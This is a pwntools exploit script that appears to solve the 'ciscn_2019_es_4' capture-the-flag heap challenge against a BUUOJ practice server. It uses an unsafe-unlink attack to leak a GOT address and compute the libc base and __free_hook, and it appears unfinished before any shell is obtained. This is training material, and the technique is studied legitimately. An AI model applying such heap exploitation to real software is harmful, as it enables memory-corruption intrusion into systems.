#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/22 22:33:47
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = "amd64"
if debug:
    if context.arch == "amd64":
        sh = process(["./ciscn_2019_es_4"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
        # sh = process('./ciscn_2019_es_4')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF("../../libc_file/16-64-libc-2.23.so")
        one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
    else:
        sh = process(["./ciscn_2019_es_4"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
        #sh = process("./")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc = ELF("../../libc_file/16-32-libc-2.23.so")
else:
    IP = 'node4.buuoj.cn'
    port = 25079
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
def debug():
    gdb.attach(sh)
    pause()

elf = ELF('ciscn_2019_es_4')
def cmd(choice):
    sh.recvuntil("4.show\n")
    sh.sendline(str(choice))

def add(idx,size,content):
    cmd(1)
    sh.recvuntil("index:\n")
    sh.sendline(str(idx))
    sh.recvuntil("size:\n")
    sh.sendline(str(size))
    sh.recvuntil("gift: ")
    heap_addr = int(sh.recv(7),16)
    sh.recvuntil("content:\n")
    sh.send(content)
    return heap_addr

def dele(idx):
    cmd(2)
    sh.recvuntil("index:\n")
    sh.sendline(str(idx))

def edit(idx,content):
    cmd(3)
    sh.recvuntil("index:")
    sh.sendline(str(idx))
    sh.recvuntil("content:\n")
    sh.send(content)

def show(idx):
    cmd(4)
    sh.recvuntil("index:\n")
    sh.sendline(str(idx))
heap_ptr = 0x6021E0
payload = p64(0) + p64(0xf1)
payload += p64(heap_ptr -0x18) + p64(heap_ptr -0x10)
payload = payload.ljust(0xf0,'a')
payload += p64(0xf0)
add(32,0xf8,payload)
add(31,0xf8,'a'*0x80)
add(30,0x80,'a'*0x80)
add(1,0x80,"/bin/sh\x00")
edit(32,payload)
dele(31)
payload = p64(0) + p64(elf.got['free']) + p64(0) + p64(heap_ptr-0x18) + p32(1)*52 + p32(2) + p32(2)
edit(32,payload)
show(30)
free_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
log.info("free_addr=>{}".format(hex(free_addr)))
libc_base = free_addr - libc.symbols['free']
free_hook = libc_base + libc.symbols['__free_hook']
log.info("libc_base=>{}".format(hex(libc_base)))
log.info("free_hook=>{}".format(hex(free_hook)))

# debug()

sh.interactive()